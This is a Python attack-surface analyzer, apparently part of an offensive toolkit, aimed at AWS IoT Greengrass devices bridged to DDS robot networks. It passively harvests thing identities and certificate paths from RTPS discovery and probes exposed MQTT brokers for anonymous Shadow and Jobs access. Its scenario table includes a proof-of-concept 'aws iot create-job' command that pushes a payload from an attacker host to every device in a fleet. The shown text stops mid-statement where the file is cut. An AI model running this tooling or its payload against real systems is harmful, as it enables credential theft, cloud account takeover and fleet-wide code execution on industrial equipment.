#!/usr/bin/env python3
"""
aws_iot_bridge.py — AWS IoT Greengrass ↔ DDS Bridge Attack Surface Analyzer
=============================================================================
ROS2Reaper Phase 3 Module

Detects AWS IoT Greengrass v2 deployments co-located with DDS, enumerates
the bridge attack surface, and generates PoC attack scenarios for crossing
from the DDS domain into the AWS IoT ecosystem — up to and including full
AWS account pivot via the Greengrass IAM role.

Attack Surface Overview:
    ┌─────────────────────────────────────────────────────────┐
    │  DDS Domain (robot/ICS)                                 │
    │      ↕  aws.greengrass.ros2.DDS component               │
    │  Greengrass v2 Core Device                              │
    │      ↕  MQTT over TLS → AWS IoT Core                   │
    │  AWS Cloud                                              │
    │      ├── IoT Core (topic broker)                        │
    │      ├── Device Shadow (digital twin state)             │
    │      ├── IoT Jobs (OTA / fleet command dispatch)        │
    │      └── IAM Role (EC2/S3/Lambda lateral movement)      │
    └─────────────────────────────────────────────────────────┘

Four attack vectors:
    1. Greengrass v2 DDS Component Detection
       Fingerprint Greengrass on the host via DDS participant metadata,
       process signals, filesystem artifacts, and local IPC socket.

    2. X.509 Cert / Thing ARN Exfil via DDS Metadata
       Greengrass publishes its AWS thing name and certificate paths
       in DDS participant properties during discovery — passively
       exfiltrable with zero Greengrass interaction.

    3. Local MQTT Shadow Injection
       Greengrass runs a local MQTT broker (port 8883) for component
       IPC. Misconfigured deployments bind to 0.0.0.0 instead of
       127.0.0.1, exposing the Device Shadow update topic to any
       network-adjacent host. Shadow writes propagate to AWS IoT Core
       and are consumed by cloud-side SCADA/dashboards.

    4. IoT Jobs / OTA Command Abuse
       AWS IoT Jobs dispatches fleet-wide commands via the Jobs API.
       If the Greengrass IAM role has iot:CreateJob or iot:UpdateJob
       permissions, an attacker with DDS access who pivots to the
       Greengrass credential store can push malicious OTA updates
       to every device in the fleet.

Author  : Gh057x
Phase   : 3 — ICS/OT Bridge
Requires: requests, paho-mqtt (optional)

Usage:
    python3 aws_iot_bridge.py --target 10.0.0.5
    python3 aws_iot_bridge.py --cidr 192.168.1.0/24 --deep
    python3 aws_iot_bridge.py --target 10.0.0.5 --shadow-enumerate
    python3 aws_iot_bridge.py --target 10.0.0.5 --output report.json
"""

import socket
import struct
import ssl
import os
import re
import json
import time
import threading
import argparse
import ipaddress
from datetime import datetime
from dataclasses import dataclass, field, asdict
from typing import Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import paho.mqtt.client as mqtt
    PAHO_AVAILABLE = True
except ImportError:
    PAHO_AVAILABLE = False


# ─────────────────────────────────────────────────────────────────────────────
# CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────

# Greengrass v2 local MQTT broker — IPC for components
GREENGRASS_MQTT_PORT       = 8883
GREENGRASS_MQTT_ALT_PORTS  = [8884, 8885]

# Greengrass v2 local HTTP IPC (component recipe API)
GREENGRASS_IPC_HTTP_PORT   = 7779

# DDS discovery ports
DDS_DISC_PORTS             = [7400, 7410, 7650, 7660, 8650, 8660]

# AWS IoT Core endpoints
AWS_IOT_CORE_PORT          = 8883     # MQTT over TLS
AWS_IOT_DATA_PORT          = 443      # HTTPS Jobs/Shadow API

# Greengrass v2 default filesystem paths (Linux)
GREENGRASS_DEFAULT_ROOT    = "/greengrass/v2"
GREENGRASS_CONFIG_PATH     = "/greengrass/v2/config/effectiveConfig.yaml"
GREENGRASS_CERTS_DIR       = "/greengrass/v2/thingShadow"
GREENGRASS_IPC_SOCKET      = "/greengrass/v2/ipc.socket"
GREENGRASS_RECIPE_DIR      = "/greengrass/v2/packages/artifacts"
GREENGRASS_LOG_DIR         = "/greengrass/v2/logs"

# DDS participant property keys that Greengrass publishes
GREENGRASS_DDS_PROP_KEYS = [
    "aws.greengrass.ros2.DDS",
    "aws_thing_name",
    "aws_thing_arn",
    "gg_thing_name",
    "greengrass_thing",
    "aws.greengrass",
    "iot_endpoint",
    "aws_region",
    "aws_account_id",
    "certificate_arn",
    "certificate_pem_path",
    "private_key_path",
    "root_ca_path",
]

# RTPS participant name patterns that indicate Greengrass
GREENGRASS_PARTICIPANT_PATTERNS = [
    r"greengrass",
    r"gg_core",
    r"aws[\._\-]iot",
    r"aws[\._\-]ros",
    r"ros2[\._\-]dds[\._\-]bridge",
    r"iot[\._\-]core[\._\-]bridge",
    r"greengrass[\._\-]dds",
    r"fleet[\._\-]provisioning",
]

# MQTT topic patterns for AWS IoT Shadow and Jobs
AWS_SHADOW_TOPICS = {
    "update":          "$aws/things/{thing}/shadow/update",
    "update_accepted": "$aws/things/{thing}/shadow/update/accepted",
    "update_rejected": "$aws/things/{thing}/shadow/update/rejected",
    "update_delta":    "$aws/things/{thing}/shadow/update/delta",
    "get":             "$aws/things/{thing}/shadow/get",
    "get_accepted":    "$aws/things/{thing}/shadow/get/accepted",
    "delete":          "$aws/things/{thing}/shadow/delete",
    # Named shadow variants
    "named_update":    "$aws/things/{thing}/shadow/name/{shadow}/update",
}

AWS_JOBS_TOPICS = {
    "notify":          "$aws/things/{thing}/jobs/notify",
    "notify_next":     "$aws/things/{thing}/jobs/notify-next",
    "get_pending":     "$aws/things/{thing}/jobs/get",
    "start_next":      "$aws/things/{thing}/jobs/start-next",
    "update":          "$aws/things/{thing}/jobs/{job_id}/update",
    "describe":        "$aws/things/{thing}/jobs/{job_id}/get",
}

# Greengrass component names that indicate DDS bridge is installed
GREENGRASS_DDS_COMPONENTS = [
    "aws.greengrass.ros2.DDS",
    "aws.greengrass.RosBridge",
    "aws.greengrass.Ros2Bridge",
    "com.example.ros2.DDS",
    "aws.greengrass.GenericMQTTtoIPCAgent",
]

# Known Greengrass IAM policy actions that enable fleet pivot
DANGEROUS_IAM_ACTIONS = [
    "iot:CreateJob",
    "iot:UpdateJob",
    "iot:DeleteJob",
    "iot:DescribeJob",
    "iot:ListJobExecutions",
    "iot:UpdateJobExecution",
    "iot:CreateThingGroup",
    "iot:AddThingToThingGroup",
    "s3:PutObject",         # OTA artifact upload
    "s3:GetObject",         # OTA artifact pull
    "lambda:InvokeFunction",
    "greengrass:CreateDeployment",
    "greengrass:UpdateDeployment",
]


# ─────────────────────────────────────────────────────────────────────────────
# ATTACK SCENARIOS
# ─────────────────────────────────────────────────────────────────────────────

AWS_IOT_ATTACK_SCENARIOS = [
    {
        "id":            "AWS-001",
        "name":          "X.509 Cert Path Exfil via DDS Participant Metadata",
        "description":   (
            "Greengrass v2 publishes its AWS Thing name, certificate ARN, and "
            "credential file paths in DDS participant properties during the RTPS "
            "SPDP discovery handshake. This occurs passively — the attacker only "
            "needs to be present on the DDS domain and receive the announcement. "
            "With the certificate path known, a host-local attacker (or a "
            "misconfigured file share) can exfiltrate the X.509 client cert and "
            "private key, authenticate to AWS IoT Core as the device, and assume "
            "its full IAM identity."
        ),
        "dds_signal":    "Passive SPDP discovery (ics_dds_enum.py --passive)",
        "aws_impact":    "Thing identity theft → full IAM role assumption",
        "cvss":          "8.6",
        "cwe":           "CWE-200",
        "mitre_ics":     "T0840 — Network Connection Enumeration",
        "mitre_att&ck":  "T1552.004 — Credentials in Files",
        "prerequisites": "DDS domain access (no host access required for path disclosure)",
    },
    {
        "id":            "AWS-002",
        "name":          "Local MQTT Shadow Injection (0.0.0.0 Binding Misconfiguration)",
        "description":   (
            "Greengrass v2 runs a local MQTT broker for component IPC. The default "
            "configuration binds to 127.0.0.1, but misconfigured or containerized "
            "deployments bind to 0.0.0.0, exposing port 8883 on the network interface. "
            "The Device Shadow update topic ($aws/things/{thing}/shadow/update) accepts "
            "JSON payloads that are forwarded to AWS IoT Core with no additional "
            "validation. Shadow state is consumed by cloud-side SCADA dashboards, "
            "digital twin platforms, and fleet management systems."
        ),
        "dds_signal":    "Greengrass participant detected + port 8883 open on non-loopback",
        "aws_impact":    "Device Shadow poisoning → cloud dashboard/SCADA state manipulation",
        "cvss":          "9.1",
        "cwe":           "CWE-668",
        "mitre_ics":     "T0832 — Manipulation of View",
        "mitre_att&ck":  "T1565.001 — Stored Data Manipulation",
        "prerequisites": "Network access to port 8883 on the Greengrass device",
    },
    {
        "id":            "AWS-003",
        "name":          "IoT Jobs OTA Fleet Command Injection",
        "description":   (
            "AWS IoT Jobs dispatches fleet-wide commands — firmware updates, config "
            "changes, script execution — to device groups. If the Greengrass core "
            "device's IAM role includes iot:CreateJob or greengrass:CreateDeployment, "
            "an attacker who pivots to the credential store (via DDS participant "
            "metadata → cert exfil → AWS CLI auth) can push a malicious Job to every "
            "device in the thing group. A Job document pointing to an attacker-controlled "
            "S3 artifact executes arbitrary code across the entire fleet with the "
            "permissions of each device's IAM role."
        ),
        "dds_signal":    "Thing ARN exfiltrated → AWS credential store access",
        "aws_impact":    "Fleet-wide arbitrary code execution via OTA Job dispatch",
        "cvss":          "10.0",
        "cwe":           "CWE-284",
        "mitre_ics":     "T0839 — Module Firmware",
        "mitre_att&ck":  "T1072 — Software Deployment Tools",
        "prerequisites": "X.509 cert + key (from AWS-001) + iot:CreateJob IAM permission",
        "poc_sketch":    (
            "aws iot create-job \\\n"
            "  --job-id 'gg-pwn-001' \\\n"
            "  --targets 'arn:aws:iot:<region>:<account>:thinggroup/<group>' \\\n"
            "  --document '{\"operation\":\"install\",\"packageName\":\"malicious\","
            "\"url\":\"https://attacker.com/payload.sh\"}' \\\n"
            "  --target-selection CONTINUOUS"
        ),
    },
    {
        "id":            "AWS-004",
        "name":          "Greengrass IPC Socket Pivot (Local Privilege Escalation)",
        "description":   (
            "If an attacker has achieved code execution on the Greengrass host (e.g., "
            "via DDS node impersonation → ROS 2 exploitation → shell), the Greengrass "
            "v2 IPC socket (/greengrass/v2/ipc.socket) provides an unauthenticated "
            "local API for component lifecycle management. Components running as the "
            "Greengrass service account (ggc_user) can subscribe to any IoT Core "
            "topic, publish to the Shadow API, retrieve secrets from Secrets Manager, "
            "and invoke Lambda functions — all using the device's IAM role."
        ),
        "dds_signal":    "Host-level code execution via Phase 2 exploitation chain",
        "aws_impact":    "Full AWS IAM role access — Secrets Manager, Lambda, S3, IoT Core",
        "cvss":          "9.8",
        "cwe":           "CWE-269",
        "mitre_ics":     "T0822 — External Remote Services",
        "mitre_att&ck":  "T1078 — Valid Accounts",
        "prerequisites": "Local code execution on the Greengrass host",
        "attack_chain":  (
            "ROS2Reaper Phase 2 (node_impersonation / topic_injection) "
            "→ shell on Greengrass host "
            "→ /greengrass/v2/ipc.socket "
            "→ SubscribeToIoTCore (all MQTT) "
            "→ PublishToIoTCore (shadow/jobs) "
            "→ GetSecretValue (Secrets Manager) "
            "→ IAM role pivot"
        ),
    },
    {
        "id":            "AWS-005",
        "name":          "DDS→Shadow Bridge: Robot State Spoofing in Digital Twin",
        "description":   (
            "The aws.greengrass.ros2.DDS component maps ROS 2 topic messages to "
            "Device Shadow reported state fields. An attacker who injects fabricated "
            "DDS messages (Phase 2 topic_injection.py) causes the Greengrass bridge "
            "to report false robot state to the AWS Device Shadow — which propagates "
            "to AWS IoT TwinMaker, fleet dashboards, and monitoring systems. Fleet "
            "operators see nominal robot state while the physical robot operates "
            "abnormally or has been compromised."
        ),
        "dds_signal":    "Any Phase 2 topic injection against a Greengrass-bridged robot",
        "aws_impact":    "Digital twin state poisoning, fleet monitoring blind spot",
        "cvss":          "8.2",
        "cwe":           "CWE-494",
        "mitre_ics":     "T0832 — Manipulation of View",
        "mitre_att&ck":  "T1565.002 — Transmitted Data Manipulation",
        "prerequisites": "DDS topic injection (Phase 2) on a Greengrass-bridged robot",
        "tool_chain":    "topic_injection.py → Greengrass DDS bridge → AWS Shadow → TwinMaker",
    },
]


# ─────────────────────────────────────────────────────────────────────────────
# DATA MODELS
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class GreengrassFingerprint:
    """Evidence of a Greengrass v2 deployment on a host."""
    host:                     str
    confirmed:                bool           = False
    confidence:               float          = 0.0    # 0.0–1.0
    evidence:                 list           = field(default_factory=list)
    # DDS metadata exfil
    thing_name:               str            = ""
    thing_arn:                str            = ""
    aws_region:               str            = ""
    aws_account_id:           str            = ""
    iot_endpoint:             str            = ""
    certificate_arn:          str            = ""
    certificate_pem_path:     str            = ""
    private_key_path:         str            = ""
    root_ca_path:             str            = ""
    # Local MQTT state
    local_mqtt_exposed:       bool           = False
    local_mqtt_port:          int            = 0
    local_mqtt_anon_access:   bool           = False
    shadow_topics_accessible: list           = field(default_factory=list)
    jobs_topics_accessible:   list           = field(default_factory=list)
    # DDS component evidence
    dds_component_confirmed:  bool           = False
    dds_participant_name:     str            = ""
    dds_properties_leaked:    dict           = field(default_factory=dict)
    # Greengrass component list (if IPC exposed)
    installed_components:     list           = field(default_factory=list)
    dds_bridge_component:     str            = ""
    # IAM / pivot potential
    iam_role_arn:             str            = ""
    dangerous_permissions:    list           = field(default_factory=list)
    fleet_pivot_viable:       bool           = False


@dataclass
class AWSIoTBridgeReport:
    """Full analysis report for a Greengrass+DDS bridge host."""
    ip:                       str
    scan_time:                str            = field(default_factory=lambda: datetime.now().isoformat())
    dds_ports_open:           list           = field(default_factory=list)
    greengrass_fingerprint:   Optional[dict] = None
    bridge_confirmed:         bool           = False
    bridge_evidence:          list           = field(default_factory=list)
    applicable_scenarios:     list           = field(default_factory=list)
    risk_level:               str            = "UNKNOWN"
    findings:                 list           = field(default_factory=list)
    recommended_poc:          list           = field(default_factory=list)
    attack_chain_narrative:   str            = ""

    def to_dict(self) -> dict:
        return asdict(self)


# ─────────────────────────────────────────────────────────────────────────────
# RTPS SPDP LISTENER — passively collect participant announcements
# ─────────────────────────────────────────────────────────────────────────────

class RTPSPassiveListener:
    """
    Minimal passive RTPS listener. Joins DDS SPDP multicast group and
    collects participant announcements, extracting participant names and
    property lists. Used to find Greengrass DDS participants without
    sending any active probes.
    """

    RTPS_MAGIC         = b"RTPS"
    SPDP_MULTICAST     = "239.255.0.1"
    PID_ENTITY_NAME    = 0x0059
    PID_PROPERTY_LIST  = 0x0062
    PID_SENTINEL       = 0x7FFF

    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout

    def listen(self, domain_ids: list = None,
               duration: float = None) -> list[dict]:
        """
        Listen for RTPS SPDP announcements. Returns list of participant dicts
        with ip, guid_prefix, participant_name, properties.
        """
        if domain_ids is None:
            domain_ids = [0, 1, 5]
        if duration is None:
            duration = self.timeout

        found    = []
        seen_keys = set()
        deadline = time.time() + duration

        for domain_id in domain_ids:
            mc_port = 7400 + (250 * domain_id)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                sock.bind(("", mc_port))
                mreq = struct.pack("4sL",
                    socket.inet_aton(self.SPDP_MULTICAST), socket.INADDR_ANY)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
                sock.settimeout(1.0)

                while time.time() < deadline:
                    try:
                        data, addr = sock.recvfrom(65535)
                        if data[:4] != self.RTPS_MAGIC:
                            continue
                        key = f"{addr[0]}:{addr[1]}"
                        if key in seen_keys:
                            continue
                        seen_keys.add(key)
                        parsed = self._parse_spdp(data, addr[0], addr[1])
                        if parsed:
                            found.append(parsed)
                    except socket.timeout:
                        continue
                sock.close()
            except PermissionError:
                break
            except OSError:
                continue

        return found

    def probe_unicast(self, ip: str, domain_ids: list = None) -> list[dict]:
        """Active unicast SPDP probe — sends a discovery packet and listens for response."""
        if domain_ids is None:
            domain_ids = [0, 1, 5]

        found = []
        probe = self._build_spdp_probe()

        for domain_id in domain_ids:
            for port_offset in [0, 10, 11]:
                port = 7400 + (250 * domain_id) + port_offset
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(self.timeout)
                    sock.sendto(probe, (ip, port))
                    data, addr = sock.recvfrom(65535)
                    sock.close()
                    if data[:4] == self.RTPS_MAGIC:
                        parsed = self._parse_spdp(data, addr[0], addr[1])
                        if parsed:
                            found.append(parsed)
                except (socket.timeout, OSError):
                    pass

        return found

    def _build_spdp_probe(self) -> bytes:
        """Minimal RTPS SPDP announcement to elicit participant responses."""
        import random
        guid_prefix = bytes([random.randint(0, 255) for _ in range(12)])
        header = self.RTPS_MAGIC + b"\x02\x02\x01\x0f" + guid_prefix
        ts_sec  = int(time.time())
        info_ts = struct.pack("<BBHll", 0x09, 0x01, 8, ts_sec, 0)
        data_payload = (
            b"\x00\x00\x10\x00"
            b"\x00\x01\x00\xc2"
            b"\x00\x01\x00\xc1"
            + struct.pack("<ii", 0, 1)
            + b"\x01\x00\x00\x00"
        )
        data_submsg = struct.pack("<BBH", 0x15, 0x05, len(data_payload)) + data_payload
        return header + info_ts + data_submsg

    def _parse_spdp(self, data: bytes, src_ip: str, src_port: int) -> Optional[dict]:
        """Extract participant name and properties from an RTPS packet."""
        if len(data) < 20 or data[:4] != self.RTPS_MAGIC:
            return None

        result = {
            "ip":               src_ip,
            "port":             src_port,
            "guid_prefix":      data[8:20].hex(":"),
            "vendor_id":        struct.unpack(">H", data[6:8])[0],
            "participant_name": "",
            "properties":       {},
        }

        offset = 20
        while offset < len(data) - 4:
            submsg_id = data[offset]
            length    = struct.unpack_from("<H", data, offset + 2)[0]
            if length == 0:
                break
            if submsg_id == 0x15:   # DATA
                self._extract_data_params(
                    data[offset + 4: offset + 4 + length], result
                )
            offset += 4 + length

        # Only return if we got something useful
        if result["participant_name"] or result["properties"]:
            return result
        # Still return if it responded — IP is valuable
        return result

    def _extract_data_params(self, data: bytes, result: dict):
        """Extract PID_ENTITY_NAME and PID_PROPERTY_LIST from DATA submessage."""
        if len(data) < 20:
            return
        offset = 20   # skip DATA fixed fields
        while offset < len(data) - 4:
            pid    = struct.unpack_from("<H", data, offset)[0]
            plen   = struct.unpack_from("<H", data, offset + 2)[0]
            if pid == self.PID_SENTINEL:
                break
            param_data = data[offset + 4: offset + 4 + plen]

            if pid == self.PID_ENTITY_NAME and len(param_data) >= 5:
                try:
                    nlen = struct.unpack_from("<I", param_data, 0)[0]
                    result["participant_name"] = param_data[4:4+nlen].decode(
                        "utf-8", errors="replace").rstrip("\x00")
                except Exception:
                    pass

            elif pid == self.PID_PROPERTY_LIST and len(param_data) >= 4:
                try:
                    num  = struct.unpack_from("<I", param_data, 0)[0]
                    off2 = 4
                    for _ in range(min(num, 64)):
                        if off2 + 8 > len(param_data):
                            break
                        klen = struct.unpack_from("<I", param_data, off2)[0]
                        off2 += 4
                        key  = param_data[off2:off2+klen].decode(
                            "utf-8", errors="replace").rstrip("\x00")
                        off2 += klen
                        vlen = struct.unpack_from("<I", param_data, off2)[0]
                        off2 += 4
                        val  = param_data[off2:off2+vlen].decode(
                            "utf-8", errors="replace").rstrip("\x00")
                        off2 += vlen
                        result["properties"][key] = val
                except Exception:
                    pass

            offset += 4 + plen
            if plen % 4:
                offset += 4 - (plen % 4)


# ─────────────────────────────────────────────────────────────────────────────
# GREENGRASS FINGERPRINTER
# ─────────────────────────────────────────────────────────────────────────────

class GreengrassFingerprinter:
    """
    Multi-signal Greengrass v2 detection and metadata extraction.

    Signal sources:
        1. RTPS SPDP participant name patterns
        2. RTPS participant property list (thing name, cert paths, ARN)
        3. Local MQTT port 8883 binding (0.0.0.0 vs 127.0.0.1)
        4. Greengrass IPC HTTP port 7779
        5. AWS IoT Core endpoint DNS patterns
    """

    def __init__(self, timeout: float = 4.0):
        self.timeout  = timeout
        self.listener = RTPSPassiveListener(timeout=timeout)

    def fingerprint(self, ip: str,
                    deep: bool = False,
                    domain_ids: list = None) -> GreengrassFingerprint:
        fp = GreengrassFingerprint(host=ip)

        # ── Signal 1: DDS participant probe ───────────────────────────────────
        participants = self.listener.probe_unicast(ip, domain_ids or [0, 1, 5])

        for participant in participants:
            pname = participant.get("participant_name", "").lower()
            props  = participant.get("properties", {})

            # Participant name pattern match
            for pattern in GREENGRASS_PARTICIPANT_PATTERNS:
                if re.search(pattern, pname, re.IGNORECASE):
                    fp.confidence            += 0.35
                    fp.dds_component_confirmed = True
                    fp.dds_participant_name    = participant["participant_name"]
                    fp.evidence.append(f"DDS participant name matches Greengrass pattern: '{pname}'")
                    break

            # ── Signal 2: Property list exfil ─────────────────────────────────
            for key, val in props.items():
                key_lower = key.lower()
                val_lower = val.lower() if val else ""

                # Thing name / ARN
                if any(k in key_lower for k in ["thing_name", "gg_thing", "aws_thing"]):
                    fp.thing_name  = val
                    fp.confidence += 0.20
                    fp.evidence.append(f"Thing name leaked in DDS property: {key}={val}")
                    fp.dds_properties_leaked[key] = val

                elif "thing_arn" in key_lower or ("arn:aws:iot" in val_lower):
                    fp.thing_arn   = val
                    fp.confidence += 0.20
                    fp.evidence.append(f"Thing ARN leaked in DDS property: {key}={val}")
                    fp.dds_properties_leaked[key] = val
                    # Extract region + account from ARN
                    arn_match = re.search(
                        r"arn:aws:iot:([^:]+):(\d+):thing/(.+)", val
                    )
                    if arn_match:
                        fp.aws_region      = arn_match.group(1)
                        fp.aws_account_id  = arn_match.group(2)
                        fp.thing_name      = fp.thing_name or arn_match.group(3)

                elif "iot_endpoint" in key_lower or "ats.iot" in val_lower:
                    fp.iot_endpoint = val
                    fp.confidence  += 0.15
                    fp.evidence.append(f"AWS IoT endpoint leaked: {key}={val}")
                    fp.dds_properties_leaked[key] = val
                    # Extract region from endpoint
                    ep_match = re.search(r"\.iot\.([^.]+)\.amazonaws\.com", val)
                    if ep_match:
                        fp.aws_region = fp.aws_region or ep_match.group(1)

                elif "certificate_arn" in key_lower or "cert_arn" in key_lower:
                    fp.certificate_arn = val
                    fp.confidence     += 0.15
                    fp.evidence.append(f"Certificate ARN leaked: {key}={val}")
                    fp.dds_properties_leaked[key] = val

                elif any(k in key_lower for k in ["cert_pem", "certificate_pem", "cert_path"]):
                    fp.certificate_pem_path = val
                    fp.confidence          += 0.20
                    fp.evidence.append(f"Certificate PEM path leaked: {key}={val}")
                    fp.dds_properties_leaked[key] = val

                elif any(k in key_lower for k in ["private_key", "privkey", "key_path"]):
                    fp.private_key_path = val
                    fp.confidence      += 0.20
                    fp.evidence.append(f"Private key path leaked: {key}={val}")
                    fp.dds_properties_leaked[key] = val

                elif any(k in key_lower for k in ["root_ca", "ca_cert", "ca_path"]):
                    fp.root_ca_path  = val
                    fp.confidence   += 0.05
                    fp.evidence.append(f"Root CA path leaked: {key}={val}")
                    fp.dds_properties_leaked[key] = val

                elif "aws.greengrass" in key_lower or "greengrass" in val_lower:
                    fp.confidence += 0.15
                    fp.evidence.append(f"Greengrass identifier in property: {key}={val}")
                    fp.dds_properties_leaked[key] = val

        # ── Signal 3: Local MQTT port check ──────────────────────────────────
        for port in [GREENGRASS_MQTT_PORT] + GREENGRASS_MQTT_ALT_PORTS:
            if self._tcp_open(ip, port):
                if port == GREENGRASS_MQTT_PORT or port in GREENGRASS_MQTT_ALT_PORTS:
                    fp.local_mqtt_exposed = True
                    fp.local_mqtt_port    = port
                    fp.confidence        += 0.25
                    fp.evidence.append(
                        f"Port {port}/tcp open — Greengrass local MQTT broker "
                        "reachable from network (should be localhost-only)"
                    )

                    # Check anonymous access
                    anon = self._check_mqtt_anon(ip, port)
                    if anon:
                        fp.local_mqtt_anon_access = True
                        fp.confidence            += 0.15
                        fp.evidence.append(
                            f"Greengrass local MQTT on {port} accepts anonymous connections"
                        )
                break

        # ── Signal 4: Greengrass IPC HTTP port ───────────────────────────────
        if self._tcp_open(ip, GREENGRASS_IPC_HTTP_PORT):
            fp.confidence += 0.20
            fp.evidence.append(
                f"Port {GREENGRASS_IPC_HTTP_PORT}/tcp open — "
                "Greengrass v2 IPC HTTP server exposed"
            )
            if deep and REQUESTS_AVAILABLE:
                components = self._enumerate_components_http(ip)
                if components:
                    fp.installed_components = components
                    for comp in components:
                        if any(dds_comp in comp for dds_comp in GREENGRASS_DDS_COMPONENTS):
                            fp.dds_bridge_component = comp
                            fp.dds_component_confirmed = True
                            fp.confidence             += 0.30
                            fp.evidence.append(
                                f"DDS bridge component confirmed via IPC API: {comp}"
                            )

        # ── Signal 5: MQTT shadow / jobs topic probing ────────────────────────
        if fp.local_mqtt_anon_access and fp.thing_name and PAHO_AVAILABLE:
            shadow_accessible, jobs_accessible = self._probe_shadow_and_jobs(
                ip, fp.local_mqtt_port or GREENGRASS_MQTT_PORT, fp.thing_name
            )
            fp.shadow_topics_accessible = shadow_accessible
            fp.jobs_topics_accessible   = jobs_accessible
            if shadow_accessible:
                fp.confidence += 0.20
                fp.evidence.append(
                    f"AWS Shadow topics accessible: {shadow_accessible[:2]}"
                )

        # ── IAM pivot assessment ──────────────────────────────────────────────
        if fp.thing_arn or fp.certificate_arn:
            fp.fleet_pivot_viable = True
            fp.evidence.append(
                "IAM role pivot viable — thing ARN and/or certificate ARN leaked"
            )

        fp.confidence = min(fp.confidence, 1.0)
        fp.confirmed  = fp.confidence >= 0.40

        return fp

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _tcp_open(self, ip: str, port: int) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            r = s.connect_ex((ip, port))
            s.close()
            return r == 0
        except OSError:
            return False

    def _check_mqtt_anon(self, ip: str, port: int) -> bool:
        """Send MQTT CONNECT and check for CONNACK return code 0x00 (accepted)."""
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(self.timeout)
            raw.connect((ip, port))
            try:
                raw = ctx.wrap_socket(raw, server_hostname=ip)
            except ssl.SSLError:
                pass   # Try plaintext
            raw.sendall(
                b"\x10\x25\x00\x04MQTT\x04\x00\x00\x3c"
                b"\x00\x10ros2reaper_gg"
            )
            resp = raw.recv(16)
            raw.close()
            return len(resp) >= 4 and resp[0] == 0x20 and resp[3] == 0x00
        except Exception:
            return False

    def _enumerate_components_http(self, ip: str) -> list:
        """Query the Greengrass v2 IPC HTTP server for installed components."""
        components = []
        try:
            url  = f"http://{ip}:{GREENGRASS_IPC_HTTP_PORT}/greengrass/v2/components"
            resp = requests.get(url, timeout=self.timeout, verify=False)
            if resp.status_code == 200:
                data = resp.json()
                for comp in data.get("components", []):
                    components.append(comp.get("componentName", ""))
        except Exception:
            pass
        return [c for c in components if c]

    def _probe_shadow_and_jobs(self, ip: str, port: int,
                                thing_name: str) -> tuple[list, list]:
        """Subscribe to Shadow and Jobs topics to confirm accessibility."""
        accessible_shadow = []
        accessible_jobs   = []
        done              = threading.Event()
        received          = []

        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                for key, template in AWS_SHADOW_TOPICS.items():
                    topic = template.format(thing=thing_name, shadow="default")
                    client.subscribe(topic, 0)
                for key, template in AWS_JOBS_TOPICS.items():
                    topic = template.format(thing=thing_name, job_id="+")
                    client.subscribe(topic, 0)

        def on_subscribe(client, userdata, mid, granted_qos):
            received.append(mid)
            if len(received) >= 5:
                done.set()

        try:
            c = mqtt.Client(client_id="ros2reaper_shadow_probe")
            c.on_connect   = on_connect
            c.on_subscribe = on_subscribe
            c.tls_set(cert_reqs=ssl.CERT_NONE)
            c.tls_insecure_set(True)
            c.connect(ip, port, keepalive=10)
            c.loop_start()
            done.wait(timeout=5.0)
            c.loop_stop()
            c.disconnect()

            # If we got subscribe acks, topics are accessible
            if received:
                accessible_shadow = [
                    AWS_SHADOW_TOPICS["update"].format(thing=thing_name),
                    AWS_SHADOW_TOPICS["get"].format(thing=thing_name),
                ]
                accessible_jobs = [
                    AWS_JOBS_TOPICS["notify"].format(thing=thing_name),
                ]
        except Exception:
            pass

        return accessible_shadow, accessible_jobs


# ─────────────────────────────────────────────────────────────────────────────
# BRIDGE ANALYZER
# ─────────────────────────────────────────────────────────────────────────────

class AWSIoTBridgeAnalyzer:
    """
    Produces a structured attack surface report from a GreengrassFingerprint,
    mapping evidence to findings, CVEs, and PoC attack chains.
    """

    def analyze(self, ip: str, dds_ports: list,
                fp: GreengrassFingerprint) -> AWSIoTBridgeReport:

        report = AWSIoTBridgeReport(
            ip              = ip,
            dds_ports_open  = dds_ports,
        )

        if not fp.confirmed and fp.confidence < 0.20:
            report.risk_level = "LOW"
            return report

        report.greengrass_fingerprint = asdict(fp)
        report.bridge_confirmed       = fp.confirmed
        report.bridge_evidence        = fp.evidence.copy()
        report.applicable_scenarios   = AWS_IOT_ATTACK_SCENARIOS.copy()

        # ── Finding: Cert / key path disclosure ──────────────────────────────
        if fp.certificate_pem_path or fp.private_key_path:
            paths = []
            if fp.certificate_pem_path:
                paths.append(f"cert: {fp.certificate_pem_path}")
            if fp.private_key_path:
                paths.append(f"key:  {fp.private_key_path}")
            report.findings.append({
                "id":     "AWS-DDS-001",
                "title":  "X.509 Credential Paths Leaked via DDS Participant Metadata",
                "detail": (
                    f"DDS participant at {ip} published credential filesystem paths "
                    f"in RTPS SPDP properties: {'; '.join(paths)}. "
                    "An attacker with access to the host filesystem can exfiltrate "
                    "these files to authenticate to AWS IoT Core as this device."
                ),
                "cvss":       "8.6",
                "cwe":        "CWE-200",
                "mitre_ics":  "T0840",
                "mitre_att":  "T1552.004",
            })

        # ── Finding: Thing ARN disclosed ──────────────────────────────────────
        if fp.thing_arn or fp.thing_name:
            identity_str = fp.thing_arn or f"thing name: {fp.thing_name}"
            report.findings.append({
                "id":     "AWS-DDS-002",
                "title":  "AWS IoT Thing Identity Disclosed via DDS Metadata",
                "detail": (
                    f"Thing identity exfiltrated from DDS participant properties: "
                    f"{identity_str}. "
                    + (f"Region: {fp.aws_region}. " if fp.aws_region else "")
